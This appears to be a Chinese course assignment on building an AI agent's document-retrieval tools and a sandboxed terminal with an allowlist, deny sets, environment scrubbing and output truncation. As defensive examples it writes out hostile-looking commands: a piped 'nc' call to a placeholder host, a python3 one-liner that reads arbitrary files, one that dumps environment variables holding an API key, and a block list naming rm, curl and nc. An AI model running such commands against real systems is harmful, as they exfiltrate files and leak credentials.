---
kind: assignment
track: practice
order: 4
title: "A3 检索与终端：给 agent 的接口和给人的不一样"
short: "A3 · 检索与终端"
summary: "同一个检索器，返回给人看的结果和返回给 agent 看的结果必须不同。终端是唯一有副作用的工具，所以它的每一层限制都要能被审计，包括「没有的那一层」。"
part: "第二部 · 主循环"
label: "A3"
prereq: "A2；第 3、12 章"
reading: "约 60 分钟"
problems: "P9–P10 · 11 分"
deliverable: "pipelines.search_docs / read_doc、terminal.py"
date: 2026-10-24
ready: true
tags: [ai-agents, 作业, 检索, 沙箱, 参考实现]
lang: zh
---

<h2><span class="n">1</span>这个作业要解决什么</h2>

<p class="lede">A1 的检索服务于<b>代码</b>：调用方拿到结果就直接用。A3 的检索服务于<b>模型</b>：结果会原样进入上下文窗口，而窗口是有限且昂贵的。这两者的接口不该长得一样 —— 这是 P9 的全部内容。P10 则相反：终端服务于模型，但它的风险落在真实机器上，所以限制必须写在代码里，且能被审计。</p>

<table>
  <thead><tr><th style="width:56px;">题</th><th style="width:180px;">要造的东西</th><th style="width:170px;">核心约束</th><th>为什么</th></tr></thead>
  <tbody>
    <tr><td class="num">P9</td><td><code>search_docs</code> / <code>read_doc</code></td><td>摘要 150 token、窗口 1500 token</td><td>工具结果原样进上下文，一次返回整篇文档会在两次调用内填满窗口</td></tr>
    <tr><td class="num">P10</td><td><code>run_terminal</code></td><td>白名单 + 超时 + 环境清洗 + 观测策略</td><td>唯一有副作用的工具，且模型的输出不可预测</td></tr>
  </tbody>
</table>

<div class="box finding"><span class="t">A1 与 A3 的分界线：谁承担"下一步"</span>
<p>A1 的 <code>bm25.search</code> 返回 <code>(doc_id, score)</code>，因为调用方是代码，它知道下一步该干什么。A3 的 <code>search_docs</code> 返回 <code>{doc_id, title, snippet}</code>，因为调用方是模型，<b>它必须先知道"这里有一份叫这个名字的文档，第 3 行提到了你要的词"，才可能决定要不要读</b>。多给的那两个字段（title、snippet）不是装饰，是让模型能做出"读 or 不读"这个决定的全部依据。</p>
<p>这也是为什么 <code>search_docs</code> 的描述里必须写 "<b>This is a pointer, not the document</b>"。不写的话，模型会拿 snippet 当全文，然后根据一行摘要编出答案。</p></div>

<h2><span class="n">2</span>接口签名</h2>

<table>
  <thead><tr><th style="width:330px;">签名</th><th>约束</th></tr></thead>
  <tbody>
    <tr><td><code>search_docs(docs, index, query, k=5) -> list[SearchResult]</code></td><td>每条的 <code>snippet</code> ≤ <code>SNIPPET_TOKENS = 150</code>；<b>永不返回全文</b></td></tr>
    <tr><td><code>read_doc(docs, doc_id, start_line=1) -> DocWindow</code></td><td><code>text</code> ≤ <code>WINDOW_TOKENS = 1500</code>；含 <code>total_lines</code>；未知 id 抛 <code>LookupError</code>，越界抛 <code>ValueError</code></td></tr>
    <tr><td><code>doc_lines(doc) -> list[str]</code></td><td>一行一段。行号是窗口的唯一定位方式</td></tr>
    <tr><td><code>check_command(cmd) -> str | None</code></td><td>返回拒绝原因，或 <code>None</code> 表示可执行</td></tr>
    <tr><td><code>jail() -> "sandbox-exec" | "bwrap" | "none"</code></td><td><b>必须能报告"没有沙箱"</b></td></tr>
    <tr><td><code>LocalTerminal.run(cmd, *, workspace, timeout) -> TerminalResult</code></td><td>先 <code>check_command</code>；超时返回 <code>timed_out=True</code>，不抛异常</td></tr>
    <tr><td><code>FakeTerminal(script, default)</code></td><td>确定性测试用；<b>仍然执行 check_command</b></td></tr>
    <tr><td><code>ToolContext.observation(raw) -> str</code></td><td>超过 <code>TERMINAL_TOKENS = 800</code> 时头 60% + 尾 30%</td></tr>
  </tbody>
</table>

<h2><span class="n">3</span>模块划分</h2>

<table>
  <thead><tr><th style="width:170px;">位置</th><th>责任</th></tr></thead>
  <tbody>
    <tr><td><code>pipelines.py</code>（文档检索段）</td><td><code>build_doc_index</code> / <code>search_docs</code> / <code>_snippet</code> / <code>read_doc</code>，共约 90 行</td></tr>
    <tr><td><code>terminal.py</code></td><td>白名单、拒绝原因、三个执行层、两种终端实现，153 行</td></tr>
    <tr><td><code>toolset.py</code>（两处）</td><td><code>search_docs</code>/<code>read_doc</code> 的包装（把 <code>DocWindow</code> 变成模型可读的文本）；<code>ToolContext.observation</code></td></tr>
  </tbody>
</table>

<p>三处分开的理由不同：文档检索放在 <code>pipelines.py</code> 是因为它<b>不需要模型</b>（和 BM25 同类）；终端单独一个文件是因为它有<b>三层互相独立的限制</b>，混进 toolset 会让"这个命令为什么被拒"变得难查；而 <b>观测策略放在 <code>ToolContext</code></b> 是因为它是会话级设置（<code>TERMINAL_TOKENS</code> 可能因会话而异），不是终端的属性。</p>

<h2><span class="n">4</span>关键逻辑逐段解读</h2>

<h3>4.1 snippet 是怎么选出来的</h3>

<pre><code>def _snippet(doc, query):
    terms = set(tokenize(query))
    best, best_hits = "", 0
    for line in doc_lines(doc):
        hits = len(terms & set(tokenize(line)))
        if hits > best_hits:
            best, best_hits = line, hits
    if not best:
        best = doc_lines(doc)[0]          # 一条都没命中，给第一行
    ...</code></pre>

<p>规则简单到近乎粗暴：<b>逐行数命中词，取最多的那一行</b>。不选"前后三行的窗口"，不选"最优段落"。理由是结果要能被审计 —— 用户看到 <code>snippet</code> 时可以自己核对"这一行确实有我要的词"，而一个跨行窗口会让人怀疑它是不是拼接出来的。</p>

<p>实测四类查询的片段长度（六份文档全部 5–7 行）：</p>

<table>
  <thead><tr><th style="width:230px;">查询</th><th style="width:230px;">命中</th><th>snippet token</th></tr></thead>
  <tbody>
    <tr><td><code>meals reimbursement</code></td><td>expense-policy-2025, expense-policy-2026</td><td class="num">13, 13</td></tr>
    <tr><td><code>hybrid office days</code></td><td>employee-handbook</td><td class="num">35</td></tr>
    <tr><td><code>who owns GridLens</code></td><td>org-chart, product-faq</td><td class="num">17, 9</td></tr>
    <tr><td><code>hotel limit</code></td><td><b>零结果</b></td><td>—</td></tr>
  </tbody>
</table>

<p>最后一行是个真问题。文档里写的是 <code>Hotels: up to $180 per night</code>，查询是 <code>hotel</code> —— 分词器不做词干化，<code>hotels ≠ hotel</code>，而 <code>limit</code> 在文档里根本没出现（它说的是 <code>up to</code>）。<b>两类不同的问题叠在一起，表现为同一个症状：零结果。</b></p>

<p>这不是 bug，是这一作业要你看见的东西：</p>

<table>
  <thead><tr><th style="width:130px;">问题</th><th style="width:180px;">症状</th><th>修法与代价</th></tr></thead>
  <tbody>
    <tr><td>词形变化</td><td><code>hotel</code> / <code>meal</code> 查不到 <code>Hotels</code> / <code>Meals</code></td><td>加轻量词干化（Porter）或 <code>s</code> 后缀归一。代价：<code>Bed</code> 与 <code>Beds</code> 也会合并，可能引入误命中</td></tr>
    <tr><td>同义表达</td><td><code>limit</code> 查不到 <code>up to</code></td><td>要么做查询扩展，要么<b>让 agent 换词重查</b> —— 这正是 agent 相对 pipeline 的优势</td></tr>
  </tbody>
</table>

<p><b>把这两条写进 A6 的 design memo。它们是"检索错"和"没做过检索"之外的第三种失败：检索做了、也做对了，问题出在词法层。</b></p>

<h3>4.2 窗口：一个当前语料里从未被触发的机制</h3>

<pre><code>taken, tokens, i = [], 0, start_line - 1
while i &lt; total:
    t = count_tokens(lines[i])
    if taken and tokens + t &gt; WINDOW_TOKENS:
        break
    taken.append(lines[i])
    tokens += t
    i += 1</code></pre>

<p>注意 <code>if taken and ...</code>：<b>至少返回一行，哪怕这一行本身就超过 1500 token</b>。没有这个判断，一个超长的单行段落会让 <code>read_doc</code> 返回空文本，而模型会以为文档是空的、然后无限重试同一页。</p>

<p>但这里必须诚实：<b>参考语料里最大的文档是 177 token，窗口 1500 —— 分页从来没有真正发生过。</b>那个 <code>while</code> 循环在现有数据上第一次迭代就结束，<code>end_line == total_lines</code>，<code>more</code> 提示永远不出现。对应的测试（断言 <code>count_tokens(text) ≤ WINDOW_TOKENS</code>）在这份语料上是<b>空转的</b>：它通过，但不是因为分页正确，而是因为不需要分页。</p>

<div class="box note"><span class="t">所以你要自己造一份大文档</span>
<p>造一份 8000 token 的员工手册（一行一段，约 20 段），然后验证四件事：<b>① 第一次 <code>read_doc</code> 的 <code>end_line &lt; total_lines</code></b>；<b>② 返回里带 <code>start_line = end_line + 1</code> 的提示</b>；<b>③ 连续调用能无重复无遗漏地覆盖全文</b>（把所有返回的 <code>start_line..end_line</code> 拼起来等于 <code>1..total_lines</code>）；<b>④ 单行超长时至少返回那一行</b>。</p>
<p>第 ③ 条是最容易错的 —— 差一（off-by-one）会让一行被读两次或漏掉，而模型不会告诉你"有一行你跳过了"。</p></div>

<h3>4.3 终端的四层，第四层是"没有"</h3>

<p><code>terminal.py</code> 的顺序是：先语法检查，再执行，执行时受超时和环境约束，最外层才是操作系统隔离。<b>最关键的一句话在文件头：Windows 上没有第四层。</b></p>

<table>
  <thead><tr><th style="width:46px;">层</th><th style="width:180px;">实现</th><th style="width:210px;">挡住什么</th><th>挡不住什么</th></tr></thead>
  <tbody>
    <tr><td class="num">1</td><td>白名单（27 个程序）</td><td>不在名单上的程序、<code>bash</code>、<code>rm</code>、<code>curl</code></td><td>白名单程序本身的越权（<code>python3</code> 能读写任何文件）</td></tr>
    <tr><td class="num">2</td><td>语法拒绝</td><td>here-doc、命令替换、重定向</td><td>用 <code>python3 -c</code> 做同样的事</td></tr>
    <tr><td class="num">3</td><td>超时 + 环境清洗</td><td>挂死、泄漏 API key</td><td>慢速的数据外泄（分多次小请求）</td></tr>
    <tr><td class="num">4</td><td><code>sandbox-exec</code> / <code>bwrap</code></td><td>文件系统与网络的越权</td><td><b>Windows 上不存在这一层</b></td></tr>
  </tbody>
</table>

<p>检查的<b>顺序</b>是有讲究的：</p>

<pre><code>if "&lt;&lt;" in cmd:      return "here-documents (&lt;&lt;) are not allowed; …"
if "$(" in cmd or "`" in cmd: return "command substitution is not allowed"
if "&gt;" in cmd or "&lt;" in cmd:  return "redirection is not allowed; …"

for segment in re.split(r"\||;|&&|\|\|", cmd):
    name = Path(segment.split()[0]).name
    if name in NEEDS_SHELL: return f"{name} is not allowed: it would run arbitrary commands"
    if name in FETCHERS:    return f"{name} is not allowed: network access is outside the sandbox"
    if name in DESTRUCTIVE: return f"{name} is not allowed: it changes files outside the workspace"
    if name not in ALLOWED: return f"{name} is not on the allowlist"</code></pre>

<p>三个集合分开写，是为了让拒绝信息<b>具体</b>：<code>rm</code> 得到"会改动工作区之外的文件"，<code>curl</code> 得到"网络访问在沙箱之外"，<code>nc</code> 得到"网络"，而 <code>ruby</code> 得到"不在白名单上"。<b>一个只会说"不允许"的终端，模型会连续试五次。</b>具体的拒绝理由是提示词的一部分（见 A2 的 4.6）。</p>

<p>用 <code>Path(program).name</code> 而不是直接比较，是为了挡住 <code>/bin/rm</code> 这种路径写法。分段用 <code>re.split(r"\||;|&&|\|\|")</code>，是为了让 <code>cat x | nc host 80</code> 里的 <code>nc</code> 也被检查到 —— 这条有专门的测试（<code>test_rejects_a_program_hidden_behind_a_pipe</code>），而且它最初断言的是 <code>"not on the allowlist"</code>，实际触发的是网络分支，<b>改断言而不是改代码</b>，因为两个分支都正确，只是谁先命中。</p>

<h3>4.4 jail()：把"没有"报告出来</h3>

<pre><code>def jail() -> str:
    if sys.platform == "darwin" and shutil.which("sandbox-exec"): return "sandbox-exec"
    if sys.platform.startswith("linux") and shutil.which("bwrap"):  return "bwrap"
    return "none"</code></pre>

<p>三行代码，但它做了一件工程上很少见的事：<b>主动暴露自己能力的缺口</b>。文件头的理由值得原文引用 —— "a limit you believe in but do not have is worse than a limit you know is missing"。</p>

<p>这条在实测里是真实生效的：参考实现跑在这台 Windows 机器上，<code>jail()</code> 返回 <code>"none"</code>。<b>也就是说 A3 的终端在这个环境里只有三层。</b>一个 <code>python3 -c "open('/anything').read()"</code> 是可以通过白名单的。写作业时必须知道这一点，否则你会以为自己做了一个沙箱。</p>

<div class="box note"><span class="t">这一节的正确用法</span>
<p>不是"去 Windows 上补一个沙箱"，而是<b>在 A6 的 design memo 里写清：我的威胁模型在什么平台上成立，在什么平台上不成立</b>。真实项目里最常见的失误不是"没做隔离"，而是"文档写着已隔离、实际在某平台上没有"。<code>jail()</code> 的作用是让这句话无法被含糊地写下去。</p></div>

<h3>4.5 环境清洗：为什么只留三个变量</h3>

<pre><code>env = {"PATH": os.environ.get("PATH", ""),
       "HOME": str(cwd),
       "LANG": "C.UTF-8"}</code></pre>

<p>不继承 <code>os.environ</code>，而是自建一个白名单。理由不是"整洁"，是<b>钱</b>：<code>AGENTLAB_API_KEY</code> 如果被继承，一条 <code>python3 -c "import os;print(os.environ)"</code> 就能把它打印进上下文，然后它会被写入账本、写进 transcript、出现在评测报告里。<b>一条能泄漏 key 的命令，就是一条能花钱的命令。</b></p>

<p>把 <code>HOME</code> 指向 workspace 也是同一类考虑：让 <code>~</code> 落在工作区里，而不是用户真实的 home。</p>

<h3>4.6 观测策略：头 60% + 尾 30%</h3>

<pre><code>def observation(self, raw):
    if count_tokens(raw) &lt;= TERMINAL_TOKENS: return raw
    head = raw[: int(TERMINAL_TOKENS * 4 * 0.6)]
    tail = raw[-int(TERMINAL_TOKENS * 4 * 0.3):]
    return f"{head}\n… [{dropped} characters omitted; narrow the command to see them] …\n{tail}"</code></pre>

<p>为什么不是"前 800 token"：命令输出的有用部分<b>经常在末尾</b>（汇总行、错误、退出时的统计）。只留头部，模型会看到一大堆数据然后看不到结论。为什么不是"头尾各一半"：头部通常包含表头或第一条记录，是理解尾部的前提，所以给 60%。</p>

<p>为什么留 10% 的余量而不把 800 用满：中间的省略提示本身要占字符，而它携带的信息（<b>丢了多少、怎么看到</b>）比多留 80 token 的输出更重要。省略提示里那句 "narrow the command to see them" 是给模型的行动建议 —— 没有它，模型会重跑同一条命令。</p>

<p>另一个选项是<b>把完整输出写进文件并告诉模型路径</b>。这在真实环境里更好（模型可以 <code>grep</code> 那个文件），但这个沙箱禁止重定向，所以参考实现选了截断。<b>这是 A6 memo 的第五问：两种做法各自的失败模式是什么？</b></p>

<h2><span class="n">5</span>实现步骤</h2>

<ol>
  <li><b><code>_snippet</code> 先写，逐行打分选最优行</b>。先跑一遍四个查询看结果，你会立刻看到 <code>hotel limit</code> 的零结果 —— 不要急着修，先把它记进 memo。</li>
  <li><b><code>read_doc</code> 的窗口</b>。先写"至少一行"的保护，再写 token 累计。<b>然后自己造一份 8000 token 的大文档</b>，验证 4.2 的四条。</li>
  <li><b><code>search_docs</code> 的组装</b>。注意它只返回三个字段，<code>total_lines</code> 是给 <code>read_doc</code> 的、不是给 <code>search_docs</code> 的。</li>
  <li><b><code>check_command</code> 的三段</b>：语法拒绝 → 分段 → 逐段查三个集合 + 白名单。<b>先写测试再写实现</b>，因为拒绝信息的措辞会被测试断言。</li>
  <li><b><code>FakeTerminal</code></b>。它必须<b>照样</b>调用 <code>check_command</code> —— 否则被拒的命令在测试里会"执行成功"，A5 的注入测试就失去了意义。</li>
  <li><b><code>LocalTerminal</code></b>。注意 <code>shell=True</code>（因为要支持管道）、<code>errors="replace"</code>（输出可能不是合法 UTF-8）、<code>\r\n → \n</code>（Windows 换行会让 token 计数虚高）。</li>
  <li><b><code>observation</code></b> 放进 <code>ToolContext</code>。<code>run_terminal</code> 里对 stdout 和 stderr 各调一次。</li>
  <li><b>打印 <code>jail()</code></b>，把它写进 README 的第一段。<b>在你的平台上它返回什么，你的沙箱就有几层。</b></li>
</ol>

<h2><span class="n">6</span>验证标准</h2>

<h3>检索（5 条）</h3>

<table>
  <thead><tr><th style="width:300px;">判定</th><th>通过标准</th></tr></thead>
  <tbody>
    <tr><td>窗口不超预算</td><td><code>count_tokens(window["text"]) ≤ 1500</code></td></tr>
    <tr><td>错误有类型</td><td>未知 doc_id → <code>LookupError</code>；<code>start_line</code> 越界 → <code>ValueError</code></td></tr>
    <tr><td>片段不超预算</td><td>每个 <code>snippet</code> ≤ 150 token，且 <code>doc_id</code>/<code>title</code> 非空</td></tr>
    <tr><td>被取代的文档仍可检索</td><td>查 <code>meals reimbursement</code> 同时命中 2025 与 2026 两份。<b>隐藏旧文档是更糟的选择</b> —— 模型需要知道存在冲突</td></tr>
    <tr><td><b>分页可用（需自造大文档）</b></td><td>8000 token 文档上：首窗 <code>end_line &lt; total_lines</code>，连续调用覆盖 <code>1..total_lines</code> 无重无漏</td></tr>
  </tbody>
</table>

<h3>终端（9 条）</h3>

<table>
  <thead><tr><th style="width:300px;">测试</th><th>通过标准</th></tr></thead>
  <tbody>
    <tr><td><code>allows_ordinary_text_tools</code></td><td><code>cat</code>/<code>grep</code>/<code>wc</code>/<code>sort</code> 通过</td></tr>
    <tr><td><code>rejects_here_documents</code></td><td>含 <code>&lt;&lt;</code> 被拒，提示里给出 <code>python3 -c</code> 的替代写法</td></tr>
    <tr><td><code>rejects_command_substitution</code></td><td><code>$()</code> 与反引号都被拒</td></tr>
    <tr><td><code>rejects_destructive_and_network_programs</code></td><td><code>rm</code> 与 <code>curl</code> 得到<b>不同</b>的拒绝理由</td></tr>
    <tr><td><code>rejects_redirection</code></td><td><code>&gt;</code> / <code>&lt;</code> 被拒</td></tr>
    <tr><td><code>rejects_unknown_programs</code></td><td><code>ruby</code> 被拒，理由是不在白名单</td></tr>
    <tr><td><code>rejects_a_program_hidden_behind_a_pipe</code></td><td><code>cat x | nc h 80</code> 被拒</td></tr>
    <tr><td><code>fake_terminal_scripts_results</code></td><td>命中脚本的命令返回预设结果，并记录命令序列</td></tr>
    <tr><td><code>fake_terminal_still_refuses</code></td><td><code>FakeTerminal</code> 对 <code>rm</code> 仍返回 <code>rejected=True</code></td></tr>
  </tbody>
</table>

<pre><code>$ pytest tests/ -q
87 passed in 1.12s

$ python -c "from agentlab.terminal import jail; print(jail())"
none          # ← 在 Windows 上；你的平台返回什么，你的沙箱就有几层</code></pre>

<div class="box takeaway"><span class="t">A3 的完成判据</span>
<p><b>① 14 条测试全绿，其中"分页"那条要用自造的 8000 token 文档才算真通过；② 能说出 <code>hotel limit</code> 为什么零结果，并分清词形问题与同义问题；③ 能准确报出 <code>jail()</code> 在你的平台上的返回值，以及因此少了哪一层。</b>第 ③ 条不是形式主义 —— 它是"你知不知道自己没做什么"的唯一证据。</p></div>

<h2><span class="n">7</span>常见坑</h2>

<table>
  <thead><tr><th style="width:250px;">现象</th><th style="width:240px;">原因</th><th>改法</th></tr></thead>
  <tbody>
    <tr><td>模型拿 snippet 当全文</td><td><code>search_docs</code> 描述没写"这是指针"</td><td>描述里明确写，且返回里带行号提示</td></tr>
    <tr><td><code>read_doc</code> 返回空文本</td><td>首行就超 1500 token，<code>while</code> 一次都没进</td><td><code>if taken and …</code> 保护</td></tr>
    <tr><td>连续 <code>read_doc</code> 有重叠或空洞</td><td><code>start_line = end_line</code> 而不是 <code>end_line + 1</code></td><td>提示文本里的数字要和实际计算的数字用同一个表达式</td></tr>
    <tr><td>零结果被当成"文档里没有"</td><td>词形/同义问题没被区分</td><td>见 4.1；在 memo 里分类</td></tr>
    <tr><td><code>/bin/rm</code> 通过检查</td><td>直接比较 <code>segment.split()[0]</code></td><td><code>Path(program).name</code></td></tr>
    <tr><td>管道后的程序没被检查</td><td>只看了整条命令的第一个词</td><td>按 <code>| ; && ||</code> 分段</td></tr>
    <tr><td>测试里被拒的命令"成功"了</td><td><code>FakeTerminal</code> 跳过了 <code>check_command</code></td><td>让它照样检查</td></tr>
    <tr><td>Windows 上输出 token 数偏高</td><td><code>\r\n</code> 被当成两个字符</td><td>读入后统一换成 <code>\n</code></td></tr>
    <tr><td>模型反复重跑同一条命令</td><td>省略提示没告诉它"该怎么做"</td><td>提示里写 "narrow the command"</td></tr>
  </tbody>
</table>

<h2><span class="n">8</span>自评备忘题</h2>

<ol>
  <li><b>如果 <code>search_docs</code> 返回全文，最坏情况会发生什么？</b>用 token 数算一遍：一份 3000 token 的文档、k=5、上下文 16000，几次调用之后窗口满了？</li>
  <li><b>你的 <code>snippet</code> 是"最佳单行"，如果答案需要相邻两行才能看懂，你会怎么改？</b>改了之后"可审计性"下降了多少？</li>
  <li><b><code>jail()</code> 在 Windows 返回 <code>none</code>，你的 agent 因此能做哪些它在 macOS 上做不到的事？</b>你会在 README 里怎么写这件事？</li>
  <li><b>为什么"输出写到文件 + 告诉模型路径"在真实环境更好，而在这个沙箱里不可行？</b>两种做法的失败模式各是什么？</li>
  <li><b>白名单里有 <code>python3</code>。它实际上让白名单形同虚设吗？</b>如果答案是"是"，那白名单还剩下什么价值？（提示：价值不在能力限制，在<b>意图的可读性</b>。）</li>
</ol>

<div class="box note"><span class="t">下一作业的接口依赖</span>
<p>A4 的压缩会把旧的工具结果换成 stub，而 <code>run_terminal</code> 的输出是最长的那种 —— <b>压缩的大部分收益来自这里</b>。所以 A3 的 <code>observation</code> 和 A4 的 stub 化是同一件事的两级：先在产生时截断到 800，再在历史里压到 160 字符。<b>两级都存在，才守得住 16000。</b></p></div>
